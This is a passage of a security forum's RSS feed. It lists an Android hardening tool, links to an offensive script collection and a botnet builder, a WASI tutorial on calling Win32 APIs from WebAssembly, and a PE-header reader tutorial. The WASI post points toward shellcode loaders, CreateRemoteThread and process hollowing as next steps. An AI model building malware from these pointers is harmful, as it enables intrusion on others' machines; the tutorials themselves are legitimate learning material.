          <guid isPermaLink="false">d.clarkee.co.uk-topic-22370</guid>
          <source url="https://d.clarkee.co.uk/t/how-to-create-your-own-russian-bot-army/22370.rss">How to create your own Russian bot army</source>
        </item>
        <item>
          <title>Android Settings hardening automation</title>
          <dc:creator><![CDATA[hts]]></dc:creator>
          <category>Programming</category>
          <description><![CDATA[
            <h1>Tool for Hardening Android settings, check/dump Apps Installed on it and list dangerous permissions used by each App</h1>
<aside class="onebox allowlistedgeneric">
  <header class="source">
      <img src="https://github.githubassets.com/favicons/favicon.svg" class="site-icon" width="32" height="32">
      <a href="https://github.com/SecTheTech/AMDH" target="_blank" rel="noopener nofollow ugc">GitHub</a>
  </header>
  <article class="onebox-body">
    <img src="https://0x00sec.s3.amazonaws.com/original/2X/c/ce1018601b44b3a642ae7f91bc041bb641c99777.png" class="thumbnail onebox-avatar" width="420" height="420">

<h3><a href="https://github.com/SecTheTech/AMDH" target="_blank" rel="noopener nofollow ugc">SecTheTech/AMDH</a></h3>

<p>Android Mobile Device Hardening. Contribute to SecTheTech/AMDH development by creating an account on GitHub.</p>


  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>

<p>Android Mobile device Hardening (AMDH) is a tool written with python3 that automate the permissions checks for applications installed on Android and can dump the APKs for the first part. The second part of the tool check and harden the settings (global and secure).</p>
<p>The settings hardening follow some CIS (Center of Internet Security) benchmark checks recommendations and Android documentation.</p>
<p><strong>Usage</strong></p>
<pre><code class="lang-auto">$ python amdh.py -h
usage: amdh.py [-h] [-H] [-a ADB_PATH] [-t {e,d,3,s}] [-D APKS_DUMP_FOLDER] [-rar] [-R]

Android Mobile Device Hardening
By default the script will scan the Android system and Apps without any modification

optional arguments:
  -h, --help            show this help message and exit
  -H                    Harden system settings /!\ Developer Options and ADB will be disabled /!\ 
  -a ADB_PATH, --adb-path ADB_PATH
                        Path to ADB binary
  -t {e,d,3,s}          Type of applications:
                                e : enabled Apps
                                d : disabled Apps
                                3 : Third party Apps
                                s : System Apps
  -D APKS_DUMP_FOLDER, --dump-apks APKS_DUMP_FOLDER
                        Dump APKs from device to APKS_DUMP_FOLDER directory
  -rar                  Remove admin receivers: Remove all admin receivers if the app is not a system App
  -R                    For each app revoke all dangerous permissions
</code></pre>
<p><strong>The next part</strong><br>
The next part is to detect malwares based on permissions analysis and add a nice GUI.</p>
<p><strong>Screenshots:</strong></p>
<ul>
<li>
<p>Applications check:<br>
</p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/4/4dc3506b8e9ba79e129a32c3eea37cac0f21aa73.png" data-download-href="/uploads/short-url/b5VdSrR4H2z52m6wzCviS5kWc83.png?dl=1" title="image" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/4/4dc3506b8e9ba79e129a32c3eea37cac0f21aa73_2_690x489.png" alt="image" data-base62-sha1="b5VdSrR4H2z52m6wzCviS5kWc83" width="690" height="489" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/4/4dc3506b8e9ba79e129a32c3eea37cac0f21aa73_2_690x489.png, https://0x00sec.s3.amazonaws.com/optimized/2X/4/4dc3506b8e9ba79e129a32c3eea37cac0f21aa73_2_1035x733.png 1.5x, https://0x00sec.s3.amazonaws.com/original/2X/4/4dc3506b8e9ba79e129a32c3eea37cac0f21aa73.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/4/4dc3506b8e9ba79e129a32c3eea37cac0f21aa73_2_10x10.png"></a></div><p></p>
</li>
<li>
<p>Settings check:<br>
</p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/f/f8333fd9184272d22fc8abe9d1db8d7c23165e22.png" data-download-href="/uploads/short-url/zpGdgGv2l6NNejjgSg5eRftvrmG.png?dl=1" title="image" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/f/f8333fd9184272d22fc8abe9d1db8d7c23165e22_2_546x500.png" alt="image" data-base62-sha1="zpGdgGv2l6NNejjgSg5eRftvrmG" width="546" height="500" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/f/f8333fd9184272d22fc8abe9d1db8d7c23165e22_2_546x500.png, https://0x00sec.s3.amazonaws.com/optimized/2X/f/f8333fd9184272d22fc8abe9d1db8d7c23165e22_2_819x750.png 1.5x, https://0x00sec.s3.amazonaws.com/original/2X/f/f8333fd9184272d22fc8abe9d1db8d7c23165e22.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/f/f8333fd9184272d22fc8abe9d1db8d7c23165e22_2_10x10.png"></a></div><p></p>
</li>
</ul>
<p>Hope it will help. Ideas and feedback are very welcome.</p>
            <p><small>9 posts - 3 participants</small></p>
            <p><a href="https://d.clarkee.co.uk/t/android-settings-hardening-automation/22219">Read full topic</a></p>
          ]]></description>
          <link>https://d.clarkee.co.uk/t/android-settings-hardening-automation/22219</link>
          <pubDate>Mon, 13 Jul 2020 09:45:58 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">d.clarkee.co.uk-topic-22219</guid>
          <source url="https://d.clarkee.co.uk/t/android-settings-hardening-automation/22219.rss">Android Settings hardening automation</source>
        </item>
        <item>
          <title>Citadel, a collection of offensive security scripts</title>
          <dc:creator><![CDATA[TSS]]></dc:creator>
          <category>Programming</category>
          <description><![CDATA[
            <p>Hello 0x00sec!<br>
Today I have finally put most of my scripts that I use during pentesting into a single repository. You can check them out here: <a href="https://github.com/wintrmvte/Citadel" rel="nofollow noopener">https://github.com/wintrmvte/Citadel</a></p>
<p>Cheers :&gt;</p>
            <p><small>4 posts - 3 participants</small></p>
            <p><a href="https://d.clarkee.co.uk/t/citadel-a-collection-of-offensive-security-scripts/22179">Read full topic</a></p>
          ]]></description>
          <link>https://d.clarkee.co.uk/t/citadel-a-collection-of-offensive-security-scripts/22179</link>
          <pubDate>Fri, 10 Jul 2020 22:49:52 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">d.clarkee.co.uk-topic-22179</guid>
          <source url="https://d.clarkee.co.uk/t/citadel-a-collection-of-offensive-security-scripts/22179.rss">Citadel, a collection of offensive security scripts</source>
        </item>
        <item>
          <title>Build Your Own Botnet - Web App</title>
          <dc:creator><![CDATA[colental]]></dc:creator>
          <category>Programming</category>
          <description><![CDATA[
            <p>I made a web GUI for the BYOB (Build Your Own Botnet) project - what do you guys think?<br>
You can check out a preview at <a href="https://buildyourownbotnet.com" rel="nofollow noopener">https://buildyourownbotnet.com</a> or get the code on GitHub at <a href="https://github.com/malwaredllc/byob" rel="nofollow noopener">https://github.com/malwaredllc/byob</a>.</p>
            <p><small>7 posts - 5 participants</small></p>
            <p><a href="https://d.clarkee.co.uk/t/build-your-own-botnet-web-app/21774">Read full topic</a></p>
          ]]></description>
          <link>https://d.clarkee.co.uk/t/build-your-own-botnet-web-app/21774</link>
          <pubDate>Sun, 14 Jun 2020 16:00:43 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">d.clarkee.co.uk-topic-21774</guid>
          <source url="https://d.clarkee.co.uk/t/build-your-own-botnet-web-app/21774.rss">Build Your Own Botnet - Web App</source>
        </item>
        <item>
          <title>Using WASI(Web Assembly System Interface) to call MessageBoxA</title>
          <dc:creator><![CDATA[stringsAreComplex]]></dc:creator>
          <category>Programming</category>
          <description><![CDATA[
            <p>Hello, this an extremely simple tutorial on how to call the win32api from WASI to peek your curisoty and maybe incite you to do more I promise suuuper simple.<br>
First what is web assembly?</p>
<p>Well the official definition is : “WebAssembly (abbreviated  <em>Wasm</em> ) is a binary instruction format for a stack-based virtual machine. Wasm is designed as a portable target for compilation of high-level languages like C/C++/Rust”,<br>
Or: " WebAssembly is an assembly language for a conceptual machine, not a physical one. This is why it can be run across a variety of different machine architectures."</p>
<p>Now what about WASI?<br>
The Official definitions goes as follow : " WASI is a modular system interface for WebAssembly. Focused on stability and portability…"<br>
Or:  “Just as WebAssembly is an assembly language for a conceptual machine, WebAssembly needs a system interface for a conceptual operating system, not any single operating system. This way, it can be run across all different OSs.<br>
This is what WASI is — a system interface for the WebAssembly platform.<br>
We aim to create a system interface that will be a true companion to WebAssembly and last the test of time. This means upholding the key principles of WebAssembly — portability and security”<br>
The key thing in here is that WASI itself is a standard, it has multiple implentations, for now there is two that are of interest.<br>
</p><aside class="onebox allowlistedgeneric">
  <header class="source">
      <img src="https://github.githubassets.com/favicons/favicon.svg" class="site-icon" width="32" height="32">
      <a href="https://github.com/wasmerio/wasmer" target="_blank" rel="noopener nofollow ugc">GitHub</a>
  </header>
  <article class="onebox-body">
    <img src="https://0x00sec.s3.amazonaws.com/original/2X/c/cb00b9f04804c98957f1b4748c8491ad0f3a6442.png" class="thumbnail" width="" height="">

<h3><a href="https://github.com/wasmerio/wasmer" target="_blank" rel="noopener nofollow ugc">wasmerio/wasmer</a></h3>

<p>🚀 The leading WebAssembly Runtime supporting WASI and Emscripten - wasmerio/wasmer</p>


  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>
<br>
<aside class="onebox allowlistedgeneric">
  <header class="source">
      <img src="https://github.githubassets.com/favicons/favicon.svg" class="site-icon" width="32" height="32">
      <a href="https://github.com/bytecodealliance/wasmtime" target="_blank" rel="noopener nofollow ugc">GitHub</a>
  </header>
  <article class="onebox-body">
    <img src="https://0x00sec.s3.amazonaws.com/original/2X/f/f784acd6e46a2e907fb9e51dd7bd59355196fdaa.png" class="thumbnail" width="" height="">

<h3><a href="https://github.com/bytecodealliance/wasmtime" target="_blank" rel="noopener nofollow ugc">bytecodealliance/wasmtime</a></h3>

<p>Standalone JIT-style runtime for WebAssembly, using Cranelift - bytecodealliance/wasmtime</p>


  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>
<br>
Which both provide a runtime, compilation backends, and an ABI and both support embeding(Note that wasmer has a greater support in general and have more bindings) , that means that you can call the runtime from a multitude of language. The Wasmtime binary is the CLI implementation of that, not the actual runtime itself.<br>
Wasmtime uses Just in time compilation and cranelift as a backend.<br>
<aside class="onebox githubblob">
  <header class="source">
      <a href="https://github.com/bytecodealliance/wasmtime/blob/main/cranelift/README.md" target="_blank" rel="noopener nofollow ugc">github.com</a>
  </header>
  <article class="onebox-body">
    <h4><a href="https://github.com/bytecodealliance/wasmtime/blob/main/cranelift/README.md" target="_blank" rel="noopener nofollow ugc">bytecodealliance/wasmtime/blob/main/cranelift/README.md</a></h4>
<pre><code class="lang-md">Cranelift Code Generator
========================

**A [Bytecode Alliance][BA] project**

Cranelift is a low-level retargetable code generator. It translates a
[target-independent intermediate representation](docs/ir.md)
into executable machine code.

[BA]: https://bytecodealliance.org/
[![Build Status](https://github.com/bytecodealliance/wasmtime/workflows/CI/badge.svg)](https://github.com/bytecodealliance/wasmtime/actions)
[![Fuzzit Status](https://app.fuzzit.dev/badge?org_id=bytecodealliance)](https://app.fuzzit.dev/orgs/bytecodealliance/dashboard)
[![Chat](https://img.shields.io/badge/chat-zulip-brightgreen.svg)](https://bytecodealliance.zulipchat.com/#narrow/stream/217117-cranelift/topic/general)
![Minimum rustc 1.37](https://img.shields.io/badge/rustc-1.37+-green.svg)
[![Documentation Status](https://docs.rs/cranelift/badge.svg)](https://docs.rs/cranelift)

For more information, see [the documentation](docs/index.md).

For an example of how to use the JIT, see the [SimpleJIT Demo], which
implements a toy language.
</code></pre>

  This file has been truncated. <a href="https://github.com/bytecodealliance/wasmtime/blob/main/cranelift/README.md" target="_blank" rel="noopener nofollow ugc">show original</a>

  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>
<br>
<aside class="onebox allowlistedgeneric">
  <header class="source">
      <img src="https://0x00sec.s3.amazonaws.com/original/3X/8/f/8fac6b5dc10c349a61f59faaf5605f105376a2ab.png" class="site-icon" width="196" height="196">
      <a href="https://bytecodealliance.github.io/wasmtime/" target="_blank" rel="noopener nofollow ugc">bytecodealliance.github.io</a>
  </header>
  <article class="onebox-body">
    <img src="" class="thumbnail" width="" height="">

<h3><a href="https://bytecodealliance.github.io/wasmtime/" target="_blank" rel="noopener nofollow ugc">Introduction - Wasmtime</a></h3>



  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>
<br>
A few Disclaimer first: WASI and WASM in general is a really new technology, it is unsatble, and outside of the broswer has very few actual practical cases, it’s support for the WindowsAPi is close to inexistant appart from the ability to read/write to files and to readDaClock, first because the standard wishes to have a POSIX like sycall inteface and also because calling the API isn’t safe by definition, it coudl allow for sandbox evasion, DLL injections and others which I am trying to implement(poorly) and that the people working on the different implentations seems to value SAfEtY above all esle. MoAr abstraction == Moar Safety it is known.<br>
I Believe that it will be oneday perfect to run modular malwares that day isn’t here yet, I have made a shellcode Loader which works but that is still a long way from being able to compile Windows.h to WASM and have a full abstracted interface, until then let’s MessageBoxA ourself to paradise.<br>
Requirements: a Rust compiler, ability to read and write Rust, Extensive Knowledge of MessageBoxA, WIndows10, a text editor, and that’s about it.
<p>So first of all let’s install rust if it isn’t already the case  <a href="https://static.rust-lang.org/rustup/dist/i686-pc-windows-gnu/rustup-init.exe" rel="noopener nofollow ugc">https://static.rust-lang.org/rustup/dist/i686-pc-windows-gnu/rustup-init.exe</a><br>
run it and then check everything is alright rustc --version.</p>
<p>then : rustup target add wasm32-unknown-unknown and rustup target add wasm32-wasi to be able to compile to our desired format.<br>
then you shall ReCusively clone the wasmtime repo, don’t forget --recursive or after that it won’t build because the .witx file will be missing.<br>
git clone --recursive <a href="https://github.com/bytecodealliance/wasmtime.git" rel="noopener nofollow ugc">https://github.com/bytecodealliance/wasmtime.git</a><br>
and then finally cargo build or cargo build --release then go do something else because that may take a while, now if it compiled without any problem you should be set for the next Part if not look at the errors and fix what went wrong.</p>
<p>Now, to add a new sycall to wasmtime you need to do two things -1 : you need to edit the wasi_snapshot_preview1.witx located at wasmtime/crates/wasi-common/WASI/phases/snapshot/witx/wasi_snapshot_preview1.witx in order to declare the new syscall</p>
<p><img src="https://0x00sec.org/images/transparent.png" alt="Annotation 2020-05-30 185814" data-orig-src="upload://96zLMdQpjmbPE4TdsspxOk6y4OC.png" width="334" height="235"></p>
<p>The function takes two arguments, and retunrs a error erno you will see later that is not true due to my laziness, it will always return Ok(()) no matter what,</p>
<p>then to the second part open crates/wasi-common/src/snapshots/wasi_snapshot_preview1.rs</p>
<p>This is where you will be defining and implementing the actual function, btw I am using the Winapi crate <a href="https://docs.rs/winapi/0.3.8/winapi/" rel="noopener nofollow ugc">https://docs.rs/winapi/0.3.8/winapi/</a> so don’t forget to add it to the cargo manifest.</p>
<p><img src="https://0x00sec.org/images/transparent.png" alt="Annotation 2020-05-30 185624" data-orig-src="upload://p0eZghx3XshfukNQUrORM2Sh2nf.png" width="690" height="410"></p>
<p>Now you will notice a few things first a reference of self(Needed for the trait impl), and the the two Agruments have the types &amp;GuestPtr&lt;&gt; which is from the <a href="https://docs.rs/wiggle/0.16.0/wiggle/struct.GuestPtr.html" rel="noopener nofollow ugc">https://docs.rs/wiggle/0.16.0/wiggle/struct.GuestPtr.html</a> crate, I suggest you read the doumentation, as well as <a href="https://github.com/WebAssembly/WASI/blob/2b027d91c29e6141a3768e638076daa23f51621c/phases/snapshot/witx/typenames.witx" rel="noopener nofollow ugc">https://github.com/WebAssembly/WASI/blob/2b027d91c29e6141a3768e638076daa23f51621c/phases/snapshot/witx/typenames.witx</a> the types definitions. We are using an unsafe Block and not MessageBoxW(Quicker to implement but you could definitly use a Utf16 vector insted of a str)Now this should compile just fine, now how do you call it you may ask, that’s actually the easier part<br>
make a new project cargo new --lib whatever edit the cargo.toml  and add under lib add crate-type =<br>
cdylib<br>
<img src="https://0x00sec.org/images/transparent.png" alt="Annotation 2020-05-30 185408" data-orig-src="upload://8aa4mM5HDszMJntbXt9NtzHVh7e.png" width="591" height="500"><br>
First define our entry point, this is needed at the moment otherwise this won’t be considered a wasi module by the runtime, next direct the compiler to link with the previously edited snapshot<br>
#[link(wasm_import_module = “wasi_snapshot_preview1”)]<br>
THe next thing to do is to define the function signature, this is important because as mistmatch will prevent you from calling it sucessfully,<br>
Next make your call to message Box with proper arguments.<br>
cargo build --target wasm32-unknown-unknown</p>
<p>next where the wasmtime cli has been built give the path of where the library has been built and press enter, you should see the message box poping, if you want to see a trace and possible error message you should set RUST_LOG=wasi_common=trace wasmtime env variable.<br>
<img src="https://0x00sec.org/images/transparent.png" alt="Annotation 2020-05-30 185707" data-orig-src="upload://nY0UpNEiadlHhowYxGWza62xGVI.png" width="690" height="335"></p>
<p>congrats you have now MessageBoxA from WASI, pretty useless I know, you now have the recipe for GetProcAddress, GetModuleHandle, VirtualAlloc, CreateRemoteThread ect…<br>
If you are interested you should try to add these to the snapshot, make a PEloader or a process hollower, use it with the runtime embeded, maybe try to compile Windows.h to WASI if it’s possible.<br>
anyway thanks for your time.<br>
Ressource I used to make this where it’s much better explained to be honest I could have both linked these two and been done with it but Idk didn’t feel complete:<br>
</p><aside class="onebox allowlistedgeneric">
  <header class="source">
      <a href="https://www.jakubkonka.com/2020/04/28/rust-wasi-from-scratch.html" target="_blank" rel="noopener nofollow ugc">jakubkonka.com</a>
  </header>
  <article class="onebox-body">
    <img src="" class="thumbnail" width="" height="">

<h3><a href="https://www.jakubkonka.com/2020/04/28/rust-wasi-from-scratch.html" target="_blank" rel="noopener nofollow ugc">Stubbing out WASI manually in Rust</a></h3>



  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>
<br>
<aside class="onebox allowlistedgeneric">
  <header class="source">
      <img src="https://0x00sec.s3.amazonaws.com/original/2X/2/28181a6fa77ff5bcb496bd7e2c326aac55333841.png" class="site-icon" width="" height="">
      <a href="https://radu-matei.com/blog/adding-wasi-syscall/" target="_blank" rel="noopener nofollow ugc" title="12:00AM - 31 March 2020">radu's blog – 31 Mar 20</a>
  </header>
  <article class="onebox-body">
    <img src="https://0x00sec.s3.amazonaws.com/original/2X/d/d03981c3ca81970f319ba264b12d5f6e167b597d.jpeg" class="thumbnail" width="" height="">

<h3><a href="https://radu-matei.com/blog/adding-wasi-syscall/" target="_blank" rel="noopener nofollow ugc">A beginner's guide to adding a new WASI syscall in Wasmtime - radu's blog</a></h3>

<p>In this article, we explore how to add a new system call to WASI, the WebAssembly System Interface, and implement it in Wasmtime</p>


  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>
<br>
bye?
            <p><small>3 posts - 2 participants</small></p>
            <p><a href="https://d.clarkee.co.uk/t/using-wasi-web-assembly-system-interface-to-call-messageboxa/21516">Read full topic</a></p>
          ]]></description>
          <link>https://d.clarkee.co.uk/t/using-wasi-web-assembly-system-interface-to-call-messageboxa/21516</link>
          <pubDate>Sat, 30 May 2020 19:19:31 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">d.clarkee.co.uk-topic-21516</guid>
          <source url="https://d.clarkee.co.uk/t/using-wasi-web-assembly-system-interface-to-call-messageboxa/21516.rss">Using WASI(Web Assembly System Interface) to call MessageBoxA</source>
        </item>
        <item>
          <title>PE-File Reader [article - dump]</title>
          <dc:creator><![CDATA[clockw0rk]]></dc:creator>
          <category>Programming</category>
          <description><![CDATA[
            <h2>Pe File Reader</h2>
<p><strong>[Opening .exe files to analyze the PE-header]</strong></p>
<p>Hello_Friend,<br>
and welcome to the 20’s, Cybermonkeys!</p>
<p>Let’s start this decade by learning some stuff.<br>
Last year, we already took an in-depth look at <a href="https://metabytezero.blogspot.com/2019/10/elf-file-structure.html" rel="noopener nofollow ugc">Linux-binaries (aka ELF files)</a>, now let’s start messing around with it’s infamous Windows-Counterpart (that also happens to be the xBox file format).</p>
<h4>Introduction</h4>
<p>The PE-file format is around for quite some time now, and while heavy optimizations took place, it hasn’t really changed all that much since then. In fact, it is one of the most widely encountered file formats out in the wilds. Although there is technically a difference between PE32 files (32bit) and PE32+ files (64bit), we will ignore this fact for the sake of this blogpost.<br>
Some file extensions deriving from this format are:</p>
<ul>
<li>.acm   [ a Windows audio-codec]</li>
<li>.ax    [MPEG-4 DVD format]</li>
<li>.cpl   [dynamic link libraries for control panels]</li>
<li>.dll   [dynamic link libraries]</li>
<li>.drv   [hardware drivers]</li>
<li>.efi   [extensible firmware interface]</li>
<li>.exe   [executable file]</li>
<li>.mui   [multilingual user interface]</li>
<li>.ocx   [activeX form extension]</li>
<li>.scr   [screensaver file format]</li>
<li>.sys   [system file]</li>
<li>.tsp   [truespeech audio format]</li>
</ul>
<p>There are other types as we will encounter, but this should give you an idea of how common this format(and it’s augmentations) is.</p>
<h4>Tools and resources</h4>
<p>Before we even start thinking about messing around with PE-files, it would help a lot to have some documentation and software to make our lives easier. Luckily for us, <a href="https://docs.microsoft.com/en-us/windows/win32/debug/pe-format#the-rsrc-section" rel="noopener nofollow ugc">Microsoft has released a structured documentation about the PE-file format.</a></p>
<p>Next, it would be nice to have a disassembler to look into the actual file (or at least a hex-viewer). One might ask why we bother to write our own program at all when there are already hundreds and hundreds of good disassemblers out there. The answer is: we are not going to write a disassembler here. We are writing a program to inspect the header file (fast) with the option to augment it so it can modify the behaviour of the executable and bend it to our will (not in this tutorial tho). Personally, <a href="https://redasm.io/" rel="noopener nofollow ugc">I found REDasm to be a nice and fast little program.</a></p>
<p><a href="https://1.bp.blogspot.com/-fPYP067UuX8/XhSknKNojoI/AAAAAAAABME/LUUxbi_4Gw8EZiMahQPNFG5zYQCF5XxvQCNcBGAsYHQ/s1600/redasm.png" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/2X/0/0cc7fde8c6116dc617f72b698fb4e8533726f60c.png" alt="" data-base62-sha1="1P4d1TN79kDD4jz9Lg4lXOQxNcE" width="320" height="227"></a>Although it can show you program flux and branches and whatnot, I only used it to view the file in hexadecimal format. Here is a picture of the PE-file header I inspected for testing purposes:</p>
<p>As you can see, I am not using much of the fancy functions that the disassembler has, although it is a good tool to start learning reverse-engineering, so kudos to the makers of this tool.<br>
[dark theme kind of sucks, but you have to decide for yourself]</p>
<p>Also it’s good to have some hello-world programs ready for testing purposes. Import and export stuff in these programs, respectively, and you will see differences in the binary structure of the files. Besides that we don’t really need anything else, I used Visual Studio, but this is dependant on your personal preferences.</p>
<h4>Differences and similarities between PE and ELF</h4>
<p><a href="https://1.bp.blogspot.com/-mWlOnaZEEZ4/XhSyAQ8UT9I/AAAAAAAABMQ/iMLQuL1YK2sMl0m1djujzrxWjkUCLzr6QCNcBGAsYHQ/s1600/800px-Portable_Executable_32_bit_Structure_in_SVG_fixed.svg.png" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/2X/5/5376a952d28cdfbf90136cc3be6b70e37c62e13f.png" alt="" data-base62-sha1="bUlRnyA6Z9krIwOyFo3rDP5G5yf" width="226" height="320"></a>For readers of my previous article, this could be quite interesting.<br>
In fact, PE-files and ELF-files aren’t that much different from each other. But Microsoft has, again, chosen their own weird methods of implementing stuff as we will see. I took a shot from Wikipedia describing the basic structure of the PE-file, you can see it in the picture.</p>
<p>Now, the probably biggest difference is the  <strong>MS-DOS stub</strong>  at the beginning of the file.<br>
Yes, you read correctly: MS-DOS!<br>
It’s still a thing, even in 2020. Microsoft has chosen this due to downward compatibility reasons. While I can not understand this choice at all, MS probably thought it would be good to have it. What it does is telling that “This program cannot be run in DOS mode” - no shit Sherlock! It is technically possible to specify another stub [with the linker option  <strong>/stub</strong> ], but why bother anyways? If anybody fires up an old 16-bit machine and tries to play Call of Duty on it, they must be crazy anyways.<br>
There is a historical importance to this stub, and yes, you could re-write your complete program to run in this 16bit stub, but if you do I will personally come to your home and spank your ass until you apologize.</p>
<p>Another interesting construct is the so called Rich-header right after the MS-DOS stub.<br>
<strong>It is essentially Microsoft spying on</strong>   <strong>you</strong>  for the purpose of “defending against Malware authors”.<br>
If you are interested in this topic or simply want to know how to get rid of the Rich-header,<br>
read <a href="http://bytepointer.com/articles/the_microsoft_rich_header.htm" rel="noopener nofollow ugc">this article</a> from bytepointer [good page, pretty old tho, recommend this one].<br>
It will show you how to patch your Linker to cut out the Rich-header.</p>
<p>So, the MS-DOS stub starts at 0x40, and including the Rich-header, it usually stretches up to 0x100 or 0x120, somewhere around there. So while we did not find anything in common with ELF-files, we already figured out that  <strong>each PE-file has an unnecessary overhead of around 100 bytes</strong> .<br>
Good job, Microsoft!</p>
<p>Okay, now let’s see whether we can find anything that these two file formats DO have in common.<br>
At the “beginning” of each PE-file we can find the  <strong>PE-file header.</strong>  If you remember the article about ELF-files, this is something both formats share. It holds basic information about the number of sections, some pointers, stuff like that.<br>
It is essentially the MS counterpart of the ELF header, except it is incomplete.<br>
For whatever reasons, there is another " <strong>optional header</strong> " following the PE-file header. Now don’t get confused here, beside the name there is nothing “optional” about this header. Only these two in conjunction form a complete PE-header. [ffs Microsoft, get your shit together]</p>
<p>Following up we can find the  <strong>data directories</strong> , essentially pointers to the sections at runtime. These are used mostly by the loader, to get to the section offsets really fast when loading up the binary for execution. They don’t serve any other purpose.</p>
<p><a href="https://1.bp.blogspot.com/-IOeWTcIxZvA/XhSz70jrowI/AAAAAAAABMc/qX65JATTe9QhWGvcZA3mCvHEiuo8ku7kACNcBGAsYHQ/s1600/ripof.jpg" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/2X/9/98f3cf60dc5e34db329b5fc804fd834db6c3ac50.jpeg" alt="" data-base62-sha1="lP4W2FodCa9AycwXdv6ckoYbCSY" width="211" height="320"></a>After that we get right into the  <strong>sections</strong> , or rather, the what-would-be section header table (although MS doesn’t call it like that). Each section contained in the program is listed here, with a pointer to the in-memory location of the section. We will get there eventually, but let’s talk about sections a bit longer.<br>
For most parts, each section in a PE-file has an almost identical counterpart inside ELF-files, often even sharing the same name. Unlike ELF-files, the PE format does not really distinguish between sections and segments. There are simply sections, period.  <strong>There is no such thing like a program header table</strong> , which may be a curse or a bless, depending on your look at it. The section header table is used for linking and loading the binary, so the PE-files are somewhat more consistent at execution time.<br>
For some reason, compilers like the one in Visual Studio sometimes place read-only data inside the .text section instead of .rdata, mixing it up with executable code. Be cautious, for this can lead to problems during disassembly.</p>
<p>One of the most important sections,  <strong>.edata</strong>  and  <strong>.idata</strong> , have no equivalent in ELF-files. They contain exported and imported functions. The .idata section specifies which symbols to import from .DLLs, while the .edata section lists symbols and addresses that the binary exports. In practise, .idata and .edata are often merged withing the .rdata section, but besides that work exactly like I just described.<br>
Resolving of external dependencies works similar to ELF-files, Microsoft just uses a struct called " <strong>Import Address Table</strong> " (or IAT) instead of the ELFish “Global Offset Table”. Microsoft uses so called  <strong>Thunks</strong>  for external library calls, which happen to be jump gates of pointers, so basically there is no big difference between Windows-thunks and ELf-stubs.</p>
<p>Another thing to know is that Visual Studio emits int3 instructions to pad and align functions. This has no deeper meaning, you could as well use nop-operations, it’s just MS’s style to do the same things and call it by different name. The int3 instructions normally serve as breakpoints for debuggers, but since they are placed in the void between actual code sections, this is not really of an issue.</p>
<h4>Implementing a File Reader [1] Opening and Reading a binary</h4>
<p>Now, let’s start implementing our own PE dumper, <a href="https://metabytezero.blogspot.com/2019/08/writing-disassembler.html" rel="noopener nofollow ugc">similar to the one we wrote for ELF files</a>,<br>
but much simpler. Think of it more like a prototype for future projects. I will talk about this at the end of the blogpost. To get to work, we first need to consider some things:</p>
<ul>
<li>How will the binary be loaded</li>
<li>How are we going to orient our self over the file</li>
<li>How do we actually read values and output them</li>
<li>How do we confirm that the values are correct</li>
</ul>
<p>For each of these points, there are slippery slopes and shortcuts, and I had to reorganize the program several times due to false assumptions, so on the way through the code, let me explain how to overcome coding problems with skill rather than with speed.</p>
<p>Let’s just look at the beginning of the main function first:</p>
<pre><code class="lang-auto">int _tmain(int argc, TCHAR *argv[])
{
 //file handles
 HANDLE targetBinary;
 LPDWORD readBytes = 0;
 DWORD fileSize;

 //the pointer that will serve as bookmark
 int readPointer = 0x0;

 //get system info to validate some byte values
 SYSTEM_INFO si;
 GetSystemInfo(&amp;si);

 fprintf(stdout, "The page size for this system is %u bytes.\n", si.dwPageSize);


 //handle to file needs to be called via CreateHandle
 targetBinary = CreateFile(L"C:/Program Files (x86)/Wizards of the Coast/MTGA/MTGA.exe", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
 fileSize = GetFileSize(targetBinary, NULL);

 fprintf(stdout, "File is %d Kbytes large\n", fileSize/1024);
 char *fileContent = new char[fileSize];

 
 if (targetBinary != INVALID_HANDLE_VALUE)
 {
  DWORD retVal = 0;
  //if function successfull, retVal is != 0
  if(!(retVal = ReadFile(targetBinary, (LPVOID)fileContent,fileSize, readBytes, NULL)))
  {
   fprintf(stdout, "There was an error reading input file!: %d returned.\n",retVal);
   exit (-1);
  }

  //fprintf(stdout, "Return value of ReadFile(5) is %d\n", retVal);
 }

   [ ... ]

 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
</code></pre>
<p>Copy</p>
<p><strong>[  1  ] The _tmain function</strong><br>
The first line already looks weird, I admit ^^<br>
